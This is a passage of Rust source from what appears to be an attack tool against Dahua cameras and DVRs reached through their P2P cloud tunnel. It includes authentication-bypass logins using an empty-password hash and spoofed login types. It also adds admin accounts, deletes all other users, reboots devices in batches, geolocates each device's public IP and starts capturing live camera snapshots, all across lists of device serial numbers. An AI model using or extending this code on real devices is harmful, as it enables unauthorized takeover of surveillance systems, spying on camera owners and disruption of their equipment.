                                    220,
                                    &set_req.to_string(),
                                )
                                .await
                            {
                                if t2.contains("result\":true") {
                                    println!("  [+] Account table updated with plaintext password");
                                }
                            }
                            return Ok(());
                        }
                        let err_str = v
                            .get("error")
                            .and_then(|e| e.get("message"))
                            .and_then(|m| m.as_str())
                            .unwrap_or("");
                        if err_str.to_lowercase().contains("exist")
                            || t.to_lowercase().contains("exist")
                        {
                            println!(
                                "  [!] user '{}' already exists on device, skipping",
                                &args.user
                            );
                            return Ok(());
                        }
                        last_err = if err_str.is_empty() {
                            format!("DVRIP addUser failed (Type={})", utype)
                        } else {
                            format!("DVRIP addUser failed (Type={}): {}", utype, err_str)
                        };
                    } else {
                        last_err = "DVRIP addUser returned non-JSON".to_string();
                    }
                }
                None => last_err = "DVRIP addUser got no reply".to_string(),
            }
        }

        // No type succeeded on this credential set: release the realm and try the
        // next candidate (if any).
        ptcp_disconnect(sock, pcp_session, realm_id).await;
    }
    Err(last_err)
}

/// Perform DHIP challenge and return the realm info plus the live channel.
/// Tries port 5000 first, then port 80 for devices that only expose DHIP on HTTP port.
async fn dhp_challenge(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    args: &Args,
    probe_timeout: Duration,
) -> Option<DhipChallengeInfo> {
    for &port in &[5000u16, 80, 37777] {
        if let Some(result) =
            dhp_challenge_on_port(sock, pcp_session, args, probe_timeout, port).await
        {
            return Some(result);
        }
    }
    None
}

async fn dhp_challenge_on_port(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    args: &Args,
    probe_timeout: Duration,
    port: u16,
) -> Option<DhipChallengeInfo> {
    let bind_timeout = args.timeout_or(15);
    let realm_id = match ptcp_bind(sock, pcp_session, port, bind_timeout).await {
        Some(r) => r,
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: ptcp_bind on {} failed", port);
            }
            return None;
        }
    };
    if args.verbose {
        eprintln!(
            "[debug] dhp_challenge: ptcp_bind on {} ok (realm={})",
            port, realm_id
        );
    }

    let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));

    let login1 = json!({
        "id": 1, "magic": "0x1234", "method": "global.login",
        "params": {
            "clientType": "Web3.0",
            "ipAddr": "127.0.0.1", "loginType": "Direct",
            "password": "", "userName": &args.admin_user,
        },
        "session": 0,
    });

    let resp1 = match dhip_call(sock, pcp_session, &dhip, &login1.to_string(), probe_timeout).await
    {
        Some(r) => r,
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: dhip_call (global.login) on port {} timed out or no reply", port);
            }
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return None;
        }
    };
    let val1: Value = match serde_json::from_str(&resp1) {
        Ok(v) => v,
        Err(e) => {
            if args.verbose {
                eprintln!(
                    "[debug] dhp_challenge: bad JSON on port {}: {} raw={:?}",
                    port, e, resp1
                );
            }
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return None;
        }
    };
    if args.verbose {
        eprintln!(
            "[debug] dhp_challenge: login reply on port {}: {}",
            port, resp1
        );
    }
    let realm = match val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
    {
        Some(r) => r.to_string(),
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: no realm in reply on port {}", port);
            }
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return None;
        }
    };
    let random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let session_id = val1.get("session").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    Some(DhipChallengeInfo {
        realm_id,
        port,
        realm,
        random,
        session_id,
    })
}

// ---- HTTP/RPC2 Flow (uses DHIP numeric realm for the password hash) ----

async fn http_try_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dh_realm: &str,
    port: u16,
    args: &Args,
    _probe_timeout: Duration,
) -> Result<(), String> {
    if args.verbose {
        eprintln!("[debug] HTTP addUser using port {}", port);
    }
    let bind_timeout = args.timeout_or(15);
    let realm_id = ptcp_bind_retry(sock, pcp_session, port, bind_timeout, args.verbose)
        .await
        .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;

    let host = format!("127.0.0.1:{}", port);
    let timeout = args.timeout_or(10);

    // Step 1: HTTP login challenge
    let login1 = json!({
        "method": "global.login",
        "params": {
            "userName": &args.admin_user,
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
        },
        "id": 10000,
    });

    let resp1 = http_call(
        sock,
        pcp_session,
        realm_id,
        &host,
        "/RPC2_Login",
        &login1.to_string(),
        timeout,
        "",
    )
    .await
    .ok_or("HTTP login challenge timeout")?;

    let resp1_body = http_extract_body(&resp1).ok_or("No body in HTTP challenge response")?;

    let val1: Value = serde_json::from_str(resp1_body)
        .map_err(|e| format!("bad JSON in HTTP challenge: {}", e))?;

    if val1
        .get("result")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        let session = val1
            .get("session")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let result =
            http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
        let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return result;
    }

    let session = val1
        .get("session")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let http_realm = val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    if session.is_empty() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("no session in HTTP challenge".into());
    }

    // Use http_realm for the bypass hash, but dh_realm for the addUser password hash
    // (SmartPSS stores HA1 with the DHIP numeric realm). When no DHIP realm is
    // available (the JSON challenge never answered, e.g. A0/SDK-only firmware),
    // fall back to the HTTP challenge realm for the addUser hash.
    let add_realm = if dh_realm.is_empty() {
        http_realm
    } else {
        dh_realm
    };
    if args.verbose {
        eprintln!("[debug] HTTP login realm: {:?}", http_realm);
        eprintln!(
            "[debug] Using {} realm for addUser hash: {:?}",
            if dh_realm.is_empty() { "HTTP" } else { "DHIP" },
            add_realm
        );
    }

    // Step 2: HTTP bypass login (same empty_password_hash as DHIP)
    let http_random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let hash = empty_password_hash(&args.admin_user, http_realm, http_random);
    let bypasses = [
        ("Loopback", "Local", "Admin"),
        ("Direct", "NetKeyboard", "Admin"),
        ("Loopback", "Local", "Default"),
        ("Direct", "NetKeyboard", "Default"),
    ];

    let mut login_ok = false;

    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, http_realm, http_random, &args.admin_pass);
        let login2 = json!({
            "method": "global.login",
            "session": &session,
            "params": {
                "userName": &args.admin_user,
                "password": pw_hash,
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "clientType": "Local",
                "authorityType": "Default",
                "passwordType": "Default",
            },
            "id": 10001,
        });
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2_Login",
            &login2.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if args.verbose {
                            eprintln!("[debug] HTTP login via password");
                        }
                        login_ok = true;
                    }
                }
            }
        }
    }

    if !login_ok {
        for (login_type, client_type, authority) in &bypasses {
            let login2 = json!({
                "method": "global.login",
                "session": &session,
                "params": {
                    "userName": &args.admin_user,
                    "password": hash,
                    "ipAddr": "127.0.0.1",
                    "loginType": login_type,
                    "clientType": client_type,
                    "authorityType": authority,
                    "passwordType": "Default",
                },
                "id": 10001,
            });
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            if args.verbose {
                                eprintln!(
                                    "[debug] HTTP login via {}/{} ({})",
                                    client_type, login_type, authority
                                );
                            }
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("HTTP bypass login failed".into());
    }

    let result = http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// HTTP addUser using the given realm (should be DHIP numeric realm).
async fn http_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    realm: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = args.timeout_or(10);
    let pw_hash = http_adduser_password_hash(&args.user, realm, &args.password);

    if args.verbose {
        eprintln!(
            "[debug] HTTP addUser hash: MD5({}:{}:{}) = {}",
            &args.user, realm, &args.password, pw_hash
        );
    }

    // Get device's supported authority list (like Smart Manager does)
    let authority_list =
        http_get_authority_list(sock, pcp_session, realm_id, host, session, timeout).await;

    let group = if args.group == "user" {
        "user"
    } else {
        "admin"
    };
    let authority_list: Vec<String> = if group == "user" {
        authority_list
            .into_iter()
            .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
            .collect()
    } else {
        authority_list
    };
    let types: &[&str] = if group == "user" {
        &["Normal"]
    } else {
        &["Normal", "Admin", "Operator"]
    };

    let mut last_err = String::new();

    for utype in types {
        let params = json!({"user": {
            "Name": &args.user,
            "Password": pw_hash,
            "Group": group,
            "Sharable": true,
            "Reserved": false,
            "Memo": &args.memo,
            "Type": utype,
            "passwordType": "Default",
            "MaxMonitorChannels": -1,
            "MacOnly": "",
            "AuthorityList": authority_list,
        }});

        let body = json!({
            "method": "userManager.addUser",
            "session": session,
            "params": params,
            "id": 101,
        });

        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            host,
            "/RPC2",
            &body.to_string(),
            timeout,
            session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!("  [+] user added via HTTP/RPC2 (Type={})", utype);
                        return Ok(());
                    }
                    let err_str = v
                        .get("error")
                        .and_then(|e| e.get("message"))
                        .and_then(|m| m.as_str())
                        .unwrap_or("");
                    let code = v
                        .get("error")
                        .and_then(|e| e.get("code"))
                        .and_then(|c| c.as_i64())
                        .unwrap_or(0);
                    if !last_err.is_empty() {
                        last_err.push_str("; ");
                    }
                    last_err.push_str(&format!("Type={} code={} '{}'", utype, code, err_str));
                    if err_str.to_lowercase().contains("exist")
                        || b.to_lowercase().contains("exist")
                    {
                        println!(
                            "  [!] user '{}' already exists on device, skipping",
                            &args.user
                        );
                        return Ok(());
                    }
                    eprintln!("[debug] HTTP addUser(Type={}) failed: {}", utype, b);
                }
            }
        } else if last_call_disc() {
            if args.verbose {
                eprintln!("[debug] HTTP addUser: device sent DISC — channel dead");
            }
            return Err("device disconnected during addUser".into());
        }
    }

    // Do NOT guess "already exists" from the error code alone (false positives on
    // some devices). Confirm the user is really present via getUserInfoAll first.
    if http_user_exists(
        sock,
        pcp_session,
        realm_id,
        host,
        session,
        &args.user,
        timeout,
    )
    .await
    {
        println!(
            "  [!] user '{}' already exists on device, skipping",
            &args.user
        );
        return Ok(());
    }

    if last_err.contains("268632079") || last_err.to_lowercase().contains("login challenge") {
        return Err(format!(
            "all HTTP addUser variants failed [{}] — hardened firmware: add requires a real authenticated session, retry with --admin-pass",
            last_err
        ));
    }
    Err(format!("all HTTP addUser variants failed [{}]", last_err))
}

/// Query userManager.getUserInfoAll via HTTP and check whether a user name exists.
async fn http_user_exists(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    name: &str,
    timeout: Duration,
) -> bool {
    let body = json!({"method": "userManager.getUserInfoAll", "session": session, "params": {}, "id": 102});
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(arr) = v
                        .get("params")
                        .and_then(|p| p.get("users"))
                        .and_then(|u| u.as_array())
                    {
                        return arr
                            .iter()
                            .any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name));
                    }
                }
            }
        }
    }
    false
}

/// Query device for supported authority list via userManager.getAuthorityList.
/// Falls back to a hardcoded list (from Smart Manager sniff log) on failure.
async fn http_get_authority_list(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    timeout: Duration,
) -> Vec<String> {
    let body = json!({
        "method": "userManager.getAuthorityList",
        "session": session,
        "params": {},
        "id": 100,
    });

    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                        let list: Vec<String> = params
                            .iter()
                            .filter_map(|s| s.as_str().map(String::from))
                            .collect();
                        if !list.is_empty() {
                            return list;
                        }
                    }
                }
            }
        }
    }

    // Fallback: Smart Manager authority list from sniff log analysis
    default_authority_list()
}

async fn http_logout(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    timeout: Duration,
) {
    let body = json!({
        "method": "global.logout",
        "session": session,
        "params": "null",
        "id": 99,
    });
    let _ = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await;
}

/// Delete the user with the given numeric Id on each device.
async fn delete_users(
    serials: &[String],
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        let chal = match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(x) => x,
            None => {
                eprintln!("  [-] DHIP challenge failed");
                continue;
            }
        };
        if args.verbose {
            eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
        }

        // Primary: DHIP delete on the live challenge channel (no re-bind).
        let mut ok = false;
        match dhip_try_delete_user(
            sock,
            pcp_session,
            &chal,
            user_id,
            user_name.clone(),
            args,
            probe_timeout,
        )
        .await
        {
            Ok(()) => {
                ok = true;
            }
            Err(e) => {
                if args.verbose {
                    eprintln!("[debug] DHIP delete failed ({}), trying HTTP", e);
                }
            }
        }
        if !ok {
            // Il canale del challenge è probabilmente morto (o il dispositivo accetta
            // un solo canale PTCP): nuovo handshake prima dei tentativi HTTP.
            let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
                    continue;
                }
            };
            let (sock2, pcp_session2) = if args.relay {
                (&hr2.agent_socket, &hr2.agent_session)
            } else {
                (&hr2.device_socket, &hr2.device_session)
            };
            for &port in &[80u16, 5000] {
                match http_try_delete_user(
                    sock2,
                    pcp_session2,
                    &chal.realm,
                    port,
                    user_id,
                    user_name.clone(),
                    args,
                )
                .await
                {
                    Ok(()) => {
                        ok = true;
                        break;
                    }
                    Err(e) => {
                        if args.verbose {
                            eprintln!("[debug] delete on port {} failed: {}", port, e);
                        }
                    }
                }
            }
        }
        if !ok {
            let label = user_name
                .as_deref()
                .map(|n| format!("'{}'", n))
                .unwrap_or_else(|| format!("{}", user_id.unwrap_or(0)));
            eprintln!("  [-] Failed to delete user {}", label);
        }
    }
    Ok(())
}

/// Delete ALL users from each device except the admin user (id 2, name "admin").
/// For each device: DHIP delete-all on the live challenge channel first, then
/// HTTP/RPC2 fallback (new handshake) on ports 80 then 5000.
async fn delete_all_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {} — DELETE ALL", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        let chal = match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(x) => x,
            None => {
                eprintln!("  [-] DHIP challenge failed");
                continue;
            }
        };
        if args.verbose {
            eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
        }

        let mut ok = false;
        match dhip_try_delete_all(sock, pcp_session, &chal, args, probe_timeout).await {
            Ok(()) => {
                ok = true;
            }
            Err(e) => {
                if args.verbose {
                    eprintln!("[debug] DHIP delete-all failed ({}), trying HTTP", e);
                }
            }
        }
        if !ok {
            let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
                    continue;
                }
            };
            let (sock2, pcp_session2) = if args.relay {
                (&hr2.agent_socket, &hr2.agent_session)
            } else {
                (&hr2.device_socket, &hr2.device_session)
            };
            for &port in &[80u16, 5000] {
                match http_try_delete_all(sock2, pcp_session2, &chal.realm, port, args).await {
                    Ok(()) => {
                        ok = true;
                        break;
                    }
                    Err(e) => {
                        if args.verbose {
                            eprintln!("[debug] delete-all on port {} failed: {}", port, e);
                        }
                    }
                }
            }
        }
        if !ok {
            eprintln!("  [-] Failed to delete all users on {}", serial);
        }
    }
    Ok(())
}

/// Reboot each device via `magicBox.reboot` over the DHIP channel
/// (handshake → challenge → established session → reboot).
async fn reboot_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        match reboot_device(serial, args, probe_timeout).await {
            Ok(()) => println!("  [+] {} → REBOOT OK", serial),
            Err(e) => eprintln!("  [-] {} → REBOOT FAIL: {}", serial, e),
        }
    }
    Ok(())
}

/// Reboot a single device: P2P handshake, DHIP challenge on the live channel,
/// establish the session and send `magicBox.reboot`.
async fn reboot_device(serial: &str, args: &Args, probe_timeout: Duration) -> Result<(), String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
        .await
        .ok_or("DHIP challenge failed (no realm)")?;
    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
    }

    let ctx = match dhip_established_session(sock, pcp_session, &chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    // magicBox.reboot — standard Dahua DHIP method for rebooting the device.
    // Alcuni firmware con `params: {}` fanno un power-off che non si completa;
    // proviamo più varianti (mode 0/1, restart, system.reboot) finché una
    // risponde "true".
    let reboot_variants: Vec<Value> = vec![
        json!({"id": 666, "method": "magicBox.reboot", "params": {"mode": 0}}),
        json!({"id": 666, "method": "magicBox.reboot", "params": {}}),
        json!({"id": 666, "method": "magicBox.reboot", "params": {"mode": 1}}),
        json!({"id": 666, "method": "magicBox.restart", "params": {}}),
        json!({"id": 666, "method": "system.reboot", "params": {}}),
    ];
    if args.verbose {
        eprintln!(
            "[debug] DHIP reboot: trying {} variants",
            reboot_variants.len()
        );
    }

    let mut result = Err("all reboot variants failed".into());
    for v in &reboot_variants {
        let method = v.get("method").and_then(|m| m.as_str()).unwrap_or("?");
        let req = json!({"id": v.get("id").unwrap(), "magic": "0x1234",
            "method": method, "params": v.get("params").unwrap(), "session": ctx.session_id});
        if args.verbose {
            eprintln!("[debug] DHIP reboot {}: {}", method, req);
        }
        match dhip_call(
            sock,
            pcp_session,
            &ctx.dhip,
            &req.to_string(),
            probe_timeout,
        )
        .await
        {
            Some(t) => {
                if args.verbose {
                    eprintln!("[debug] DHIP {} response: {}", method, t);
                }
                match serde_json::from_str::<Value>(&t) {
                    Ok(v) if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) => {
                        println!("  [+] {} accepted", method);
                        result = Ok(());
                        break;
                    }
                    Ok(v) => {
                        // Se il "result" è assente ma dentro la stringa c'è true,
                        // oppure errore esplicito — registriamo e proviamo il prossimo.
                        let msg = v
                            .get("error")
                            .and_then(|e| e.get("message"))
                            .and_then(|m| m.as_str())
                            .unwrap_or("rejected");
                        if args.verbose {
                            eprintln!("[debug] {}: {}", method, msg);
                        }
                        result = Err(format!("{}: {}", method, msg));
                    }
                    Err(_) => result = Err(format!("{}: bad response", method)),
                }
            }
            None => {
                // Il device potrebbe riavviarsi subito e chiudere il canale senza
                // rispondere: senza errore esplicito lo consideriamo inviato.
                eprintln!(
                    "  [i] {} no response (channel closed during reboot — assume sent)",
                    method
                );
                result = Ok(());
                break;
            }
        }
    }

    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    result
}

/// Check the P2P/cloud state of each device. Reads the same P2P tunnel that
/// SmartPSS would use and reports the P2P config (account/UID/status) as seen
/// by the device, so you can tell why SmartPSS shows it offline.
async fn check_p2p_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");
        match check_p2p_device(serial, args, probe_timeout).await {
            Ok(()) => {}
            Err(e) => eprintln!("  [-] {} → P2P CHECK FAIL: {}", serial, e),
        }
    }
    Ok(())
}

/// Single-device P2P state check: handshake → challenge → session → read the
/// P2P/Network config tables and report anything relevant to cloud visibility.
async fn check_p2p_device(
    serial: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;
    let device_ip = hr.device_public_ip.clone();

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
        .await
        .ok_or("DHIP challenge failed (no realm)")?;
    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
    }

    let ctx = match dhip_established_session(sock, pcp_session, &chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    println!(
        "  [i] P2P public address reported by relay: {}",
        if device_ip.is_empty() {
            "(none)"
        } else {
            &device_ip
        }
    );

    // Try multiple config tables that may expose P2P/cloud settings.
    let tables = [
        "P2P", "p2p", "Network", "network", "_Cloud", "Cloud", "System", "system",
    ];
    let mut read_any = false;
    let mut found_uid: Option<String> = None;
    for t in tables {
        let req = json!({"id": 444, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": t}, "session": ctx.session_id});
        if let Some(resp) = dhip_call(
            sock,
            pcp_session,
            &ctx.dhip,
            &req.to_string(),
            probe_timeout,
        )
        .await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&resp) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    read_any = true;
                    if args.verbose {
                        eprintln!("[debug] getConfig({}) response: {}", t, v);
                    }
                    let params = v.get("params");
                    if let Some(params) = params {
                        if let Some(uid) = extract_p2p_uid(params) {
                            if found_uid.as_deref() != Some(&uid) {
                                found_uid = Some(uid);
                            }
                        }
                        let interesting = relevant_p2p_fields(params);
                        if !interesting.is_empty() {
                            println!("  [P2P/{}] {}", t, interesting);
                        } else if is_strongly_p2p_table(t) {
                            // Tabella chiaramente P2P/cloud ma senza campi riconosciuti:
                            // stampa il contenuto pieno per vedere i dati reali.
                            let compact = params.to_string();
                            if compact.len() > 2 {
                                println!("  [P2P/{}] (raw) {}", t, compact);
                            }
                        }
                    }
                } else if args.verbose {
                    let msg = v
                        .get("error")
                        .and_then(|e| e.get("message"))
                        .and_then(|m| m.as_str())
                        .unwrap_or("");
                    eprintln!("[debug] getConfig({}) error: {}", t, msg);
                }
            }
        }
    }
    if !read_any {
        println!("  [!] device did not expose P2P/Network config via getConfig");
    }

    // UID / identificativo P2P da usare in SmartPSS (molti device usano il serial
    // stesso; a volte c'è un campo dedicato UID/SN/SeedsId). In evidenza all'inizio.
    match found_uid {
        Some(uid) if !uid.is_empty() => {
            println!(
                "\n  => P2P UID / identificativo da usare in SmartPSS: [{}]",
                uid
            );
        }
        _ => {
            println!("\n  => P2P UID non esposto dalle tabelle; prova a usare il serial come identificativo: [{}]", serial);
        }
    }

    // Ultima riga: IP pubblico della cam + geolocalizzazione (country/city).
    let geo = resolve_geo(&device_ip).await;
    let public_ip = if device_ip.is_empty() {
        "(none)".to_string()
    } else {
        device_ip.clone()
    };
    match geo {
        Some(g) => println!(
            "  => Public IP: {} | Country: {} ({}) | City: {}",
            public_ip, g.country, g.country_code, g.city
        ),
        None => println!("  => Public IP: {} | Country: N/A | City: N/A", public_ip),
    }

    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    Ok(())
}

/// Capture a live JPG snapshot of every active camera channel of each device.
/// Discovers the channels via configManager.getConfig, then grabs `/cgi-bin/
/// snapshot.cgi?channel=N` through the same PTCP tunnel.
/// Snapshot output folder. A run driven by a serials/XML file gets its own
/// `snapshot - <file stem>` folder, so batches do not pile up in a single
/// `snapshots/` dir; a single `--serial` keeps the plain name.
fn snapshot_output_dir(serials_file: Option<&str>) -> String {
    let Some(path) = serials_file else {
        return "snapshots".to_string();
    };
    let stem = std::path::Path::new(path)
        .file_stem()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default();
    let stem = stem.trim();
    if stem.is_empty() {
        return "snapshots".to_string();
    }
    format!("snapshot - {}", stem)
}

/// RTSP-over-tunnel snapshot helper. Binds a PTCP realm on the device's RTSP
/// port, relays a local port to it, and runs the real RTSP client against the
/// local end. Used both as the *first* mechanism in p2pwn parity mode (RTSP →
/// CGI → SDK is the order that already works on DVRs whose `snapshot.cgi`
/// stream truncates at the relay) and as the last PTCP fallback otherwise.
async fn grab_rtsp_tunnel(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    creds: &[(&str, String, String)],
    rtsp_port: u16,
    ch: u32,
    probe_timeout: Duration,
    verbose: bool,
) -> Option<Vec<u8>> {
    let mut rtsp_ports: Vec<u16> = vec![rtsp_port];
    for &p in &[554u16, 854] {
        if !rtsp_ports.contains(&p) {
            rtsp_ports.push(p);
        }
    }
    'rtsp_tunnel: for (label, ruser, rpass) in creds {
        if ruser.is_empty() && rpass.is_empty() {
            continue;
        }
        for &rport in &rtsp_ports {
            if verbose {
                eprintln!(
                    "  [debug] ch{} {} RTSP-over-tunnel port {} ch={}",
                    ch, label, rport, ch
                );
            }
            let Some(realm) =
                ptcp_bind_retry(sock, pcp_session, rport, probe_timeout, verbose).await
            else {
                if verbose {
                    eprintln!(
                        "  [debug] ch{} {} RTSP port {} bind failed",
                        ch, label, rport
                    );
                }
                continue;
            };
            let listener = match TcpListener::bind("127.0.0.1:0").await {
                Ok(l) => l,
                Err(e) => {
                    if verbose {
                        eprintln!("  [debug] ch{} local RTSP listener failed: {}", ch, e);
                    }
                    let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
                    continue;
                }
            };
            let Ok(local_addr) = listener.local_addr() else {
                let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
                continue;
            };
            let local_port = local_addr.port();
            if verbose {
                eprintln!(
                    "  [debug] ch{} {} relay 127.0.0.1:{} -> device:{}",
                    ch, label, local_port, rport
                );
            }
            let client_user = ruser.clone();
            let client_pass = rpass.clone();
            let ch_num = ch as u16;
            let client = tokio::spawn(async move {
                dahua_dhip_adduser::rtsp::capture_snapshot(
                    "127.0.0.1",
                    local_port,
                    ch_num,
                    &client_user,
